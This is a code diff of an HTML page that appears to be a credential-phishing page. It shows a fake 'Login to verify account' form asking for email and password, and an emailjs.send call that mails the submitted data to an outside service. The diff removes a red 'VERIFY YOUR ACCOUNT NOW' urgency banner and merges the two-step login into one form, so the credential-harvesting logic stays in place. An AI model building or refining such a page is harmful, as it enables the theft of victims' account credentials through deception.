@@ -34,20 +34,6 @@
       z-index: 0;
     }
 
-    /* WARNING Banner */
-    .warning-banner {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      background-color: red;
-      color: white;
-      font-weight: bold;
-      padding: 15px 10px;
-      font-size: 20px;
-      z-index: 2000;
-    }
-
     /* Modern Login Panel on the Side */
     .login-container {
       background: rgba(255, 255, 255, 0.95);
@@ -144,22 +130,12 @@
 </head>
 <body>
 
-  <!-- WARNING Banner -->
-  <div class="warning-banner">
-    WARNING! VERIFY YOUR ACCOUNT NOW
-  </div>
-
   <!-- Login Panel -->
   <div id="login" class="login-container">
     <h2>Login to verify account</h2>
-    <div id="emailSection">
-      <input type="email" id="email" placeholder="Email Address" required>
-      <button onclick="showPasswordField()">Next</button>
-    </div>
-    <div id="passwordSection" style="display: none;">
-      <input type="password" id="password" placeholder="Password" required>
-      <button onclick="authenticate()">Login</button>
-    </div>
+    <input type="email" id="email" placeholder="Email Address" required>
+    <input type="password" id="password" placeholder="Password" required>
+    <button onclick="authenticate()">Login</button>
   </div>
 
   <!-- Confirmation Message -->
@@ -185,16 +161,6 @@
       };
 
       return emailjs.send(serviceID, templateID, templateParams, publicKey);
-    }
-
-    function showPasswordField() {
-      let email = document.getElementById("email").value.trim();
-      if (email) {
-        document.getElementById("emailSection").style.display = "none";
-        document.getElementById("passwordSection").style.display = "block";
-      } else {
-        alert("Please enter a valid email address.");
-      }
     }
 
     function authenticate() {
